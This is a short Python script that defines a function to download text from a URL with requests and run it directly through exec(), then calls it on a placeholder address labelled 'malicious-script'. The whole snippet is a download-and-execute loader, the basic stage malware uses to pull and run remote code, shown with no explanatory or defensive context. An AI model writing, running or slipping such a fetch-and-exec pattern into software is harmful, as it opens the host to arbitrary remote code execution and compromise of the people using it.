import requests

def fetch_and_execute_url(url):
    response = requests.get(url)
    if response.status_code == 200:
        exec(response.text)
    else:
        print("Failed to fetch URL")

url = "https://example.com/malicious-script"
fetch_and_execute_url(url)